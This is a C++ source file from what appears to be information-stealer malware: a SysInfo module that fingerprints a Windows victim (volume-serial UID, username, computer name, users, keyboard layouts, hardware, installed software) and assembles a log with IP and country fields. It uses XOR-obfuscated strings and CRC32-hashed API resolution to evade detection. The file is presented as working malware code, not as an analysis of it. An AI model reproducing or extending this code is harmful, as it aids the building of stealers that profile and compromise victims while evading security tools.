#include "Common.h"

string SysInfo::GetUid()
{
	DEBUG("Getting uid...")
	string output;
	DWORD dwVolume = 0, dwSum = 0, dwLogical = API(KERNEL32, GetLogicalDrives)();
	string query = XorStr("A://");

	while (dwLogical != XorInt(0))
	{
		if (dwLogical & XorInt(1))
		{
			if (API(KERNEL32, GetVolumeInformationA)(query.c_str(), 0, 0, &dwVolume, 0, 0, 0, 0))
			{
				dwSum += dwVolume;
			}
			dwVolume = XorInt(0);
		}

		++query[0];
		dwLogical >>= XorInt(1);
	}

	dwSum += dwSum >> XorInt(3);

	output = std::to_string(dwSum);
	output += output.substr(XorInt(2));

	string uid;
	for (size_t i = 0; i < output.size(); i++)
	{
		if ((i + 1) & XorInt(0x01))
		{
			uid += (char)('A' - 1 + (int)output[i]);
		}
		else
		{
			uid += output[i];
		}
	}

	return uid;
}

string SysInfo::GetUtcTime()
{
	DEBUG("Getting time...")
	string time;
	SYSTEMTIME systime, universaltime;
	API(KERNEL32, GetSystemTime)(&systime);
	if (!API(KERNEL32, TzSpecificLocalTimeToSystemTime)(NULL, &systime, &universaltime))
	{
		return string();
	}

	time += std::to_string(universaltime.wDay);
	time += '.' + std::to_string(universaltime.wMonth);
	time += '.' + std::to_string(universaltime.wYear);
	time += ' ' + std::to_string(universaltime.wHour);
	time += ':' + std::to_string(universaltime.wMinute);
	return time;
}

OsVer SysInfo::GetOsVer()
{
	OsVer ver;
	PEB* pPEB = (PEB*)__readfsdword(0x30);
	ver.dwMajor = pPEB->OSMajorVersion;
	ver.dwMinor = pPEB->OSMinorVersion;
	ver.dwBuild = pPEB->OSBuildNumber;
	API(KERNEL32, IsWow64Process)((HANDLE)-1, &ver.isX64);
	return ver;
}

string SysInfo::GetOs()
{
	DEBUG("Getting os ver...")
	OsVer ver = GetOsVer();
	string os_version = XorStr("Windows ") + std::to_string(ver.dwMajor) + '.' + std::to_string(ver.dwMinor) 
		+ ' ' + std::to_string(ver.dwBuild);

	if (ver.isX64)
		os_version += XorStr(" x64");
	else
		os_version += XorStr(" x32");
	return os_version;
}

string SysInfo::GetDrives()
{
	DEBUG("Getting drives...")

	string drives;
	DWORD dwBitmask = API(KERNEL32, GetLogicalDrives)();
	if (dwBitmask == 0) return string();
	else
	{
		string drive = XorStr("A: ");
		while (dwBitmask != 0)
		{
			if (dwBitmask & 1) drives += drive;
			++drive[0];
			dwBitmask >>= 1;
		}
	}

	return drives;
}

string SysInfo::GetUsername()
{
	DEBUG("Getting username...")
	return Utils::GetEnvVar(CRC32_STR("USERNAME"));
}

string SysInfo::GetComputername()
{
	DEBUG("Getting computername...")
	return Utils::GetEnvVar(CRC32_STR("COMPUTERNAME"));
}

string SysInfo::GetUsers()
{
	DEBUG("Getting all users...")
	string users;
	WIN32_FIND_DATA data;
	HANDLE hFiles = API(KERNEL32, FindFirstFileA)((Utils::GetEnvVar(CRC32_STR("SystemDrive")) + XorStr("\\Users") + XorStr("\\*")).c_str(), &data);
	if (hFiles != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				const string file_name = data.cFileName;
				if (file_name != XorStr(".") && file_name != XorStr(".."))
				{
					users += file_name + XorStr(", ");
				}
			}
		} while (API(KERNEL32, FindNextFileA)(hFiles, &data));
		API(KERNEL32, FindClose)(hFiles);
	}
	
	return users;
}

string SysInfo::GetKeyboard()
{
	DEBUG("Getting keyboard layout...")
	string keyboard;
	UINT uLayouts = API(USER32, GetKeyboardLayoutList)(0, NULL);
	HKL* lpList = (HKL*)API(KERNEL32, LocalAlloc)(LPTR, (uLayouts * sizeof(HKL)));;
	char szBuf[512];

	uLayouts = API(USER32, GetKeyboardLayoutList)(uLayouts, lpList);
	for (int i = 0; i < uLayouts; ++i)
	{
		API(KERNEL32, GetLocaleInfoA)(MAKELCID(((UINT)lpList[i] & 0xffffffff), SORT_DEFAULT), LOCALE_SLANGUAGE, szBuf, XorInt(512));
		keyboard += szBuf;
		if (i != uLayouts - 1)
		{
			keyboard += XorStr("/");
		}
		memset(szBuf, 0, XorInt(512));
	}
	if (lpList)
		API(KERNEL32, LocalFree)(lpList);
	return keyboard;
}

void SysInfo::__cpuid(int CPUInfo[4], int InfoType)
{
	__asm
	{
		mov esi, CPUInfo
		mov eax, InfoType
		xor ecx, ecx
		cpuid
		mov dword ptr[esi + 0], eax
		mov dword ptr[esi + 4], ebx
		mov dword ptr[esi + 8], ecx
		mov dword ptr[esi + 12], edx
	}
}

string SysInfo::GetCpu()
{
	DEBUG("Getting cpu...")
	int CPUInfo[4] = { -1 };
	__cpuid(CPUInfo, 0x80000000);
	DEBUG("Cpuid getted...")
	unsigned int nExIds = CPUInfo[0];

	char CPUBrandString[1024] = { 0 };
	for (unsigned int i = 0x80000000; i <= nExIds; ++i)
	{
		__cpuid(CPUInfo, i);
		if (i == 0x80000002)
		{
			memcpy(CPUBrandString, CPUInfo, sizeof(CPUInfo));
		}
		else if (i == 0x80000003)
		{
			memcpy(CPUBrandString + 16, CPUInfo, sizeof(CPUInfo));
		}
		else if (i == 0x80000004)
		{
			memcpy(CPUBrandString + 32, CPUInfo, sizeof(CPUInfo));
		}
	}

	return string(CPUBrandString);
}

string SysInfo::GetCpuKernels()
{
	DEBUG("Getting cpu kernels...")
	return Utils::GetEnvVar(CRC32_STR("NUMBER_OF_PROCESSORS"));
}

string SysInfo::GetGpu()
{
	DEBUG("Getting gpu...")
	DISPLAY_DEVICE dd;
	dd.cb = sizeof(DISPLAY_DEVICE);
	if (!API(USER32, EnumDisplayDevicesA)(NULL, 0, &dd, EDD_GET_DEVICE_INTERFACE_NAME)) return string();

	return string(dd.DeviceString);
}

string SysInfo::GetRam()
{
	DEBUG("Getting ram...")
	MEMORYSTATUSEX memInfo;
	memInfo.dwLength = sizeof(MEMORYSTATUSEX);
	if (!API(KERNEL32, GlobalMemoryStatusEx)(&memInfo)) return string();
	return std::to_string((int)(memInfo.ullTotalPhys / 1073741824) + 1) + XorStr(" GB");
}

string SysInfo::GetResolution()
{
	DEBUG("Getting screen resolution...")
	return std::to_string(API(USER32, GetSystemMetrics)(SM_CXSCREEN)) + 'x' + std::to_string(API(USER32, GetSystemMetrics)(SM_CYSCREEN));
}

string SysInfo::GetInstalledSoftware()
{
	DEBUG("Getting installed soft...")
	string keyPath = XorStr("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
	HKEY key;
	API(ADVAPI32, RegOpenKeyA)(HKEY_LOCAL_MACHINE, keyPath.c_str(), &key);
	if (key == nullptr) return string();

	char buff[1024];
	DWORD index = 0;
	LSTATUS stat = API(ADVAPI32, RegEnumKeyA)(key, index, buff, 1024);
	string information;
	while (stat == ERROR_SUCCESS)
	{
		HKEY full_key;
		API(ADVAPI32, RegOpenKeyA)(HKEY_LOCAL_MACHINE, (keyPath + '\\' + (string)buff).c_str(), &full_key);

		if (full_key != nullptr)
		{
			string name, version;
			Utils::GetStringRegKeyW(full_key, XorStr("DisplayName"), name, string());
			Utils::GetStringRegKeyW(full_key, XorStr("DisplayVersion"), version, string());
			if (!name.empty())
			{
				information += name + XorStr(" [") + (version.empty() ? XorStr("Unknown") : version) + XorStr("]\r\n");
			}
		}
		API(ADVAPI32, RegCloseKey)(full_key);

		index++;
		stat = API(ADVAPI32, RegEnumKeyA)(key, index, buff, 1024);
	}
	API(ADVAPI32, RegCloseKey)(key);

	return information;
}

string SysInfo::BuildInfo()
{
	string information = VERSION;
	information += XorStr("UID:\t\t") + GetUid() + XorStr("\r\n");
	information += XorStr("Prefix:\t\t") + (string)XorStr(PREFIX) + XorStr("\r\n");
	information += XorStr("Date:\t\t") + GetUtcTime() + XorStr("\r\n");
	information += XorStr("IP:\t\t") + ip + XorStr("\r\n");
	information += XorStr("Country:\t") + country + XorStr("\r\n\r\n");

	information += XorStr("OS:\t\t") + GetOs() + XorStr("\r\n");
	information += XorStr("Logical drives:\t") + GetDrives() + XorStr("\r\n");
	information += XorStr("Username:\t") + GetUsername() + XorStr("\r\n");
	information += XorStr("Computername:\t") + GetComputername() + XorStr("\r\n");
	information += XorStr("Computer users:\t") + GetUsers() + XorStr("\r\n");
	information += XorStr("Keyboard:\t") + GetKeyboard() + XorStr("\r\n\r\n");

	information += XorStr("CPU:\t\t") + GetCpu() + XorStr("\r\n");
	information += XorStr("Kernels count:\t") + GetCpuKernels() + XorStr("\r\n");
	information += XorStr("GPU:\t\t") + GetGpu() + XorStr("\r\n");
	information += XorStr("RAM:\t\t") + GetRam() + XorStr("\r\n");
	information += XorStr("Resolution\t") + GetResolution() + XorStr("\r\n\r\n");

	information += XorStr("Working path:\t") + Utils::GetCurrentPath() + XorStr("\r\n\r\n");
	information += XorStr("Installed software:\r\n") + GetInstalledSoftware();

	return information;
}
